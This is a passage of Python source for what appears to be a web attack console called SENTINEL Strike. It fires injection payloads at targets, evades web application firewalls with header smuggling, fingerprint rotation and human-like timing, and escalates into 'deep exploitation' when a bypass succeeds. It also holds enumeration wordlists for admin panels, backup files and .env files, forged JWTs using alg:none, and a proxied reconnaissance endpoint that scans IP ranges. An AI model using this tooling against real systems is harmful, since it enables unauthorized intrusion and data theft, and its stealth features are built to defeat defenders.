                                status = resp.status_code
                                resp_headers = dict(resp.headers)
                            else:
                                # Fallback to aiohttp
                                if method == "GET":
                                    url = f"{target}?{param}={quote(variant)}"
                                    async with session.get(
                                        url, headers=headers, allow_redirects=False
                                    ) as resp:
                                        log_event({"type": "request"})
                                        content = await resp.text()
                                        status = resp.status
                                        resp_headers = dict(resp.headers)
                                elif method == "POST_FORM":
                                    headers["Content-Type"] = (
                                        "application/x-www-form-urlencoded"
                                    )
                                    data = f"{param}={quote(variant)}"
                                    async with session.post(
                                        target,
                                        headers=headers,
                                        data=data,
                                        allow_redirects=False,
                                    ) as resp:
                                        log_event({"type": "request"})
                                        content = await resp.text()
                                        status = resp.status
                                        resp_headers = dict(resp.headers)
                                else:
                                    body, json_headers = HTTPBypass.get_json_smuggled(
                                        param, variant
                                    )
                                    headers.update(json_headers)
                                    async with session.post(
                                        target,
                                        headers=headers,
                                        data=body,
                                        allow_redirects=False,
                                    ) as resp:
                                        log_event({"type": "request"})
                                        content = await resp.text()
                                        status = resp.status
                                        resp_headers = dict(resp.headers)

                            # Check for block
                            block_info = block_detector.analyze_response(
                                status, content, resp_headers, 0.0, target
                            )

                            if block_info.blocked:
                                log_event(
                                    {"type": "blocked", "reason": block_info.evidence}
                                )
                                if block_info.waf_name:
                                    log_event(
                                        {"type": "waf", "waf": block_info.waf_name}
                                    )

                                # === ADAPTIVE RATE LIMITING: Slow down on blocks ===
                                try:
                                    old_rps = rate_limiter.current_rps
                                    rate_limiter.on_rate_limit()
                                    new_rps = rate_limiter.current_rps
                                    if new_rps < old_rps:
                                        log_event(
                                            {
                                                "type": "log",
                                                "message": f"🐌 Rate limit! Slowing: {old_rps:.1f} → {new_rps:.1f} RPS",
                                                "level": "warning",
                                            }
                                        )
                                except Exception:
                                    pass

                                # === ADAPTIVE LEARNING: Record block ===
                                adaptive_engine.record_attempt(
                                    payload=variant,
                                    technique=method.lower(),
                                    waf_type=block_info.waf_name or "aws_waf",
                                    category=ml_category,
                                    success=False,
                                    response_code=status,
                                )
                                fingerprinter.record_block(
                                    ml_category, method.lower(), variant
                                )
                                # === ARTEMIS: Record block for technique switching ===
                                artemis.record_block(attack_type, method)
                            else:
                                # Request got through WAF - this IS a bypass!
                                # Calculate severity based on vector and response
                                severity = (
                                    "HIGH"
                                    if attack_type in ["sqli", "cmdi", "ssti", "rce"]
                                    else "MEDIUM"
                                )
                                if status == 200 and (
                                    "error" in content.lower()
                                    or "sql" in content.lower()
                                ):
                                    severity = "CRITICAL"

                                # Build detailed bypass info
                                # Honeypot detection: responses < 10ms are suspicious
                                honeypot_suspicious = response_time_ms < 10

                                log_event(
                                    {
                                        "type": "bypass",
                                        "technique": method,
                                        "payload": variant[:100],
                                        "url": (
                                            target_url[:100]
                                            if "target_url" in dir()
                                            else target[:100]
                                        ),
                                        "response_code": status,
                                        "vector": attack_type.upper(),
                                        "severity": severity,
                                        "evidence": f"Status {status}, {len(content)} bytes response",
                                        "response_time_ms": round(response_time_ms, 2),
                                        "honeypot_suspicious": honeypot_suspicious,
                                        "headers_used": ", ".join(
                                            [
                                                h
                                                for h in headers.keys()
                                                if h.lower().startswith("x-")
                                                or h.lower() == "transfer-encoding"
                                            ][:3]
                                        ),
                                    }
                                )

                                # === ADAPTIVE LEARNING: Record success ===
                                adaptive_engine.record_attempt(
                                    payload=variant,
                                    technique=method.lower(),
                                    waf_type="aws_waf",
                                    category=ml_category,
                                    success=True,
                                    response_code=status,
                                )
                                fingerprinter.record_bypass(
                                    ml_category, method.lower(), variant
                                )
                                # === ARTEMIS: Record bypass for reinforcement ===
                                artemis.record_bypass(
                                    attack_type, method, variant, severity
                                )

                                # === AI ADAPTIVE: Honeypot detection ===
                                if AI_ADAPTIVE_AVAILABLE and ai_engine:
                                    ai_engine.record_response(
                                        response_time_ms=response_time_ms,
                                        status_code=status,
                                        content_length=len(content),
                                        is_bypass=True,
                                        payload_type=attack_type,
                                        technique=method,
                                    )
                                    threat = ai_engine.get_threat_level()
                                    if threat != ThreatLevel.NORMAL:
                                        log_event(
                                            {
                                                "type": "log",
                                                "message": f"🍯 AI Adaptive: {threat.value} detected!",
                                                "level": (
                                                    "warning"
                                                    if threat == ThreatLevel.SUSPICIOUS
                                                    else "error"
                                                ),
                                            }
                                        )

                                finding = check_vulnerability(
                                    attack_type, variant, param, status, content
                                )
                                if finding:
                                    attack_results.append(finding)
                                    log_event({"type": "finding", "finding": finding})
                                    # === ARTEMIS: Deep exploitation triggered! ===
                                    artemis.record_finding(
                                        attack_type, method, variant, finding
                                    )
                                    # Generate deeper variants of successful payload
                                    deep_variants = artemis.get_deep_variants(
                                        waf_bypass, variant, 5
                                    )
                                    for dv in deep_variants:
                                        log_event(
                                            {
                                                "type": "artemis",
                                                "action": "deep_probe",
                                                "payload": dv[:50],
                                                "message": f"🔍 Deep probing: {dv[:30]}...",
                                            }
                                        )

                            if stealth_session.should_rotate_fingerprint():
                                stealth_session.rotate_fingerprint()
                                log_event(
                                    {
                                        "type": "fingerprint",
                                        "browser": stealth_session.current_profile.value,
                                    }
                                )

                        except Exception as e:
                            log_event(
                                {
                                    "type": "log",
                                    "message": f"Error: {str(e)[:50]}",
                                    "level": "error",
                                }
                            )

                        # Human timing (inside semaphore to stagger requests)
                        if config.get("stealth", {}).get("timing", True):
                            delay = timing.get_delay()
                            await asyncio.sleep(delay)

                # Execute all variants concurrently with semaphore limit
                await asyncio.gather(*[process_variant(v) for v in variants])

    attack_running = False


def get_payloads_for_type(attack_type: str, custom: str = "") -> List[str]:
    """Get payloads for attack type."""
    if attack_type == "custom" and custom:
        return custom.strip().split("\n")

    # Enumeration wordlists
    DIR_ENUM_PATHS = [
        "admin",
        "administrator",
        "login",
        "wp-admin",
        "wp-login.php",
        "dashboard",
        "panel",
        "controlpanel",
        "cpanel",
        "phpmyadmin",
        "adminer",
        "manager",
        "api",
        "api/v1",
        "api/v2",
        "graphql",
        "swagger",
        "docs",
        "documentation",
        "console",
        "shell",
        "terminal",
        "debug",
        "test",
        "dev",
        "staging",
        "backup",
        "backups",
        "bak",
        "old",
        "temp",
        "tmp",
        "cache",
        ".git",
        ".env",
        ".htaccess",
        "config",
        "config.php",
        "settings",
        "upload",
        "uploads",
        "files",
        "images",
        "assets",
        "static",
        "media",
        "robots.txt",
        "sitemap.xml",
        "crossdomain.xml",
        "security.txt",
        "server-status",
        "server-info",
        ".well-known",
        "actuator",
        "metrics",
        ".svn",
        ".hg",
        "CVS",
        "WEB-INF",
        "META-INF",
        "node_modules",
        "vendor",
        "packages",
        "bower_components",
        "composer.json",
        "package.json",
    ]

    SUBDOMAIN_PREFIXES = [
        "www",
        "mail",
        "ftp",
        "admin",
        "api",
        "dev",
        "staging",
        "test",
        "beta",
        "blog",
        "shop",
        "store",
        "m",
        "mobile",
        "app",
        "portal",
        "secure",
        "vpn",
        "remote",
        "webmail",
        "owa",
        "exchange",
        "autodiscover",
        "cpanel",
        "whm",
        "ns1",
        "ns2",
        "dns",
        "mx",
        "smtp",
        "pop",
        "imap",
        "cdn",
        "static",
        "assets",
        "media",
        "images",
        "img",
        "video",
        "files",
        "download",
        "git",
        "gitlab",
        "github",
        "jenkins",
        "jira",
        "confluence",
        "wiki",
        "internal",
        "intranet",
        "extranet",
        "partner",
        "vendor",
        "client",
    ]

    USER_ENUM_PAYLOADS = [
        "admin",
        "administrator",
        "root",
        "user",
        "test",
        "guest",
        "demo",
        "support",
        "info",
        "sales",
        "contact",
        "webmaster",
        "postmaster",
        "admin@",
        "user@",
        "test@",
        "info@",
        "support@",
        "sales@",
    ]

    BACKUP_FILES = [
        "backup.sql",
        "backup.zip",
        "backup.tar.gz",
        "db.sql",
        "database.sql",
        "dump.sql",
        "site.zip",
        "www.zip",
        "web.zip",
        "config.bak",
        ".env.bak",
        ".env.backup",
        "wp-config.php.bak",
        "config.php.bak",
        "index.php.bak",
        "web.config.bak",
        ".htaccess.bak",
        "settings.py.bak",
        "app.zip",
        "source.zip",
        "src.zip",
        "code.zip",
        "project.zip",
    ]

    ADMIN_PANELS = [
        "admin",
        "admin/",
        "admin/login",
        "administrator",
        "administrator/",
        "wp-admin",
        "wp-admin/",
        "wp-login.php",
        "admin.php",
        "login.php",
        "user/login",
        "auth/login",
        "signin",
        "sign-in",
        "dashboard",
        "panel",
        "controlpanel",
        "cpanel",
        "manager",
        "management",
        "backend",
        "admin-panel",
        "adminpanel",
        "sysadmin",
        "webadmin",
    ]

    ENDPOINT_DISCOVERY = [
        "/api",
        "/api/v1",
        "/api/v2",
        "/api/v3",
        "/graphql",
        "/graphiql",
        "/swagger",
        "/swagger-ui",
        "/swagger.json",
        "/openapi.json",
        "/api-docs",
        "/health",
        "/healthz",
        "/ready",
        "/status",
        "/metrics",
        "/actuator",
        "/debug",
        "/trace",
        "/info",
        "/env",
        "/config",
        "/version",
        "/.well-known/",
        "/robots.txt",
        "/sitemap.xml",
        "/crossdomain.xml",
        "/users",
        "/users/1",
        "/user/1",
        "/account",
        "/profile",
        "/me",
    ]

    IDOR_PAYLOADS = [
        "1",
        "2",
        "0",
        "-1",
        "999999",
        "admin",
        "user",
        "test",
        "../1",
        "1%00",
        "1'",
        "1 OR 1=1",
        "00000001",
        "1.0",
    ]

    JWT_PAYLOADS = [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.",  # alg: none
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
    ]

    payload_map = {
        "sqli": SQLI_PAYLOADS,
        "xss": XSS_PAYLOADS,
        "lfi": LFI_PAYLOADS,
        "cmdi": CMDI_PAYLOADS,
        "ssrf": SSRF_PAYLOADS,
        "ssti": SSTI_PAYLOADS,
        "xxe": XXE_PAYLOADS,
        "nosql": NOSQL_PAYLOADS,
        "auth": list([str(h) for h in AUTH_BYPASS_HEADERS]),
        # Enumeration
        "dir_enum": DIR_ENUM_PATHS,
        "subdomain": SUBDOMAIN_PREFIXES,
        "user_enum": USER_ENUM_PAYLOADS,
        "backup": BACKUP_FILES,
        "admin": ADMIN_PANELS,
        "endpoint": ENDPOINT_DISCOVERY,
        "idor": IDOR_PAYLOADS,
        "jwt": JWT_PAYLOADS,
    }

    if attack_type == "all":
        all_payloads = []
        for payloads in payload_map.values():
            all_payloads.extend(payloads[:5])
        return all_payloads

    return payload_map.get(attack_type, SQLI_PAYLOADS)


def check_vulnerability(
    attack_type: str, payload: str, param: str, status: int, content: str
) -> Optional[Dict]:
    """Check if response indicates vulnerability."""
    content_lower = content.lower()

    indicators = {
        "sqli": [
            "sql syntax",
            "mysql",
            "postgres",
            "sqlite",
            "ora-",
            "unclosed quotation",
        ],
        "xss": [],  # Check reflection
        "lfi": ["root:x:0:0", "[extensions]", "<?php", "for 16-bit", "/bin/bash"],
        "ssrf": ["localhost", "127.0.0.1", "metadata", "ami-id"],
        "cmdi": ["uid=", "gid=", "root", "www-data"],
        "ssti": ["49", "7777777", "__class__"],
    }

    # XSS - check reflection
    if attack_type == "xss" and payload in content:
        return {
            "type": "XSS",
            "severity": "high",
            "param": param,
            "payload": payload[:50],
            "description": f"Reflected XSS via {param}",
        }

    # Other vulnerabilities
    for indicator in indicators.get(attack_type, []):
        if indicator in content_lower:
            return {
                "type": attack_type.upper(),
                "severity": (
                    "critical" if attack_type in ["sqli", "cmdi", "lfi"] else "high"
                ),
                "param": param,
                "payload": payload[:50],
                "description": f"{attack_type.upper()} detected via {param}",
                "evidence": indicator,
            }

    return None


# ============================================================================
# DEEP RECONNAISSANCE API
# ============================================================================


@app.route("/api/recon/deep", methods=["POST"])
def api_recon_deep():
    """
    Deep Reconnaissance endpoint.
    Combines ChatbotFinder + IP Range Scanner with proxy support.
    """
    data = request.get_json() or {}
    target = data.get("target", "")
    scan_ip_range = data.get("scan_ip_range", False)
    scraperapi_key = data.get("scraperapi_key", "")
    webshare_proxy = data.get("webshare_proxy", "")

    if not target:
        return jsonify({"error": "Target URL required"}), 400

    # Build proxy URL - prioritize Webshare over ScraperAPI
    proxy_url = None
    if webshare_proxy:
        # Webshare format: http://user:pass@ip:port
        proxy_url = webshare_proxy
    elif scraperapi_key:
        proxy_url = (
            f"http://scraperapi:{scraperapi_key}@proxy-server.scraperapi.com:8001"
        )

    def run_deep_recon():
        import asyncio
        from strike.recon.chatbot_finder import ChatbotFinder

        async def execute():
            results = {
                "target": target,
                "endpoints": [],
                "ip_hosts": [],
                "all_endpoints": [],
                "summary": {},
            }

            # Step 1: ChatbotFinder
            try:
                log_event(
                    {
                        "type": "log",
                        "message": f"🔍 Starting ChatbotFinder on {target}",
                        "level": "info",
                    }
                )
                finder = ChatbotFinder(
                    timeout=15, max_concurrent=10, proxy_url=proxy_url
                )
                endpoints = await finder.discover(target)
                results["endpoints"] = [
                    {
                        "url": ep.url,
                        "type": ep.endpoint_type,
                        "confidence": ep.confidence,
                        "provider": getattr(ep, "provider", "unknown"),
                    }
                    for ep in endpoints
                ]
                log_event(
                    {
                        "type": "log",
                        "message": f"✅ ChatbotFinder: {len(endpoints)} endpoints",
                        "level": "success",
                    }
                )
            except Exception as e:
                log_event(
                    {
                        "type": "log",
                        "message": f"❌ ChatbotFinder error: {e}",
                        "level": "error",
                    }
                )

            # Step 2: IP Range Scanner (optional)
            if scan_ip_range:
                try:
                    from strike.recon.ip_range_scanner import IPRangeScanner

                    log_event(
                        {
                            "type": "log",
                            "message": "🌐 Starting IP Range Scanner...",
                            "level": "info",
                        }
                    )
                    scanner = IPRangeScanner(
                        timeout=10,
                        max_concurrent=10,
                        auto_detect_range=True,
                        proxy_url=proxy_url,
                    )
                    scan_result = await scanner.scan_domain(target)

                    # Add hosts
                    results["ip_hosts"] = [
                        {
                            "ip": h.ip,
                            "hostname": h.hostname,
                            "ports": h.ports,
                            "endpoints": [
                                {"url": ep.url, "category": ep.category}
                                for ep in h.endpoints
                            ],
                        }
                        for h in scan_result.hosts
                    ]

                    # Add endpoints by category
                    results["endpoints_by_category"] = scan_result.endpoints_by_category

                    log_event(
                        {
                            "type": "log",
                            "message": f"✅ IP Scanner: {scan_result.hosts_found} hosts, {len(scan_result.all_endpoints)} endpoints",
                            "level": "success",
                        }
                    )
                except Exception as e:
                    log_event(
                        {
                            "type": "log",
                            "message": f"❌ IP Scanner error: {e}",
                            "level": "error",
                        }
                    )

            # Build combined endpoint list
            all_eps = []
            for ep in results.get("endpoints", []):
                all_eps.append(
                    {
                        "url": ep["url"],
                        "type": ep.get("type", "chat"),
                        "confidence": ep.get("confidence", 0.5),
                    }
                )
            for host in results.get("ip_hosts", []):
                for ep in host.get("endpoints", []):
                    all_eps.append(
                        {
                            "url": ep["url"],
                            "type": ep.get("category", "unknown"),
                            "confidence": 0.7,
                        }
                    )
            results["all_endpoints"] = all_eps

            # Summary
            results["summary"] = {
                "chatbot_endpoints": len(results.get("endpoints", [])),
                "ip_hosts": len(results.get("ip_hosts", [])),
                "total_endpoints": len(all_eps),
            }

            # Save to cache for future use
            try:
                cache_path = recon_cache.save(target, results)
                log_event(
                    {
                        "type": "log",
                        "message": f"💾 Results cached to {cache_path.name}",
                        "level": "info",
                    }
                )
            except Exception as e:
                log_event(
                    {
                        "type": "log",
                        "message": f"⚠️ Cache save failed: {e}",
                        "level": "warning",
                    }
                )

            log_event({"type": "recon_complete", "data": results})
            return results

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(execute())
        finally:
            loop.close()

    # Run in background thread
    import threading

    thread = threading.Thread(target=run_deep_recon)
    thread.daemon = True
    thread.start()

    return jsonify(
        {
            "status": "started",
            "message": "Deep recon started, listen to /api/attack/stream for results",
        }
    )


# ============================================================================
# RECON CACHE API
# ============================================================================


@app.route("/api/recon/cache", methods=["POST"])
def api_recon_cache():
    """Load cached reconnaissance results."""
    data = request.get_json() or {}
    target = data.get("target", "")

    if not target:
        return jsonify({"error": "Target URL required"}), 400

    # Try to load from cache
    cached = recon_cache.load(target)
    if cached:
        cached["cached"] = True
        return jsonify(cached)

    return jsonify({"cached": False, "error": "No cached results found"})


@app.route("/api/recon/cache/list", methods=["GET"])
def api_recon_cache_list():
    """List all cached scan results."""
    return jsonify({"cached_scans": recon_cache.list_cached()})


# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("🥷 SENTINEL Strike v3.0 — Web Attack Console")
    print("=" * 60)

    # Check for payload updates on startup
    try:
        from strike.updater import PayloadUpdater
        import asyncio

        async def check_updates():
            updater = PayloadUpdater()
            result = await updater.check_updates(force=False)
            if result.get("updates_available", 0) > 0:
                print(f"\n🆕 {result['updates_available']} payload updates available!")
                update_result = await updater.update()
                print(
                    f"✅ Downloaded {update_result.get('downloaded', 0)} new payloads"
                )
            else:
                print("📦 Payloads up to date")

            # Show total payload count
            from strike.updater import get_payload_summary

            summary = get_payload_summary()
            print(f"💀 Total payloads: {summary.get('total_display', 'N/A')}")

        asyncio.run(check_updates())
    except Exception as e:
        print(f"⚠️ Updater check failed: {e}")

    print(f"\nStarting on http://localhost:5050")
    print("=" * 60)

    app.run(host="0.0.0.0", port=5050, debug=False, threaded=True)
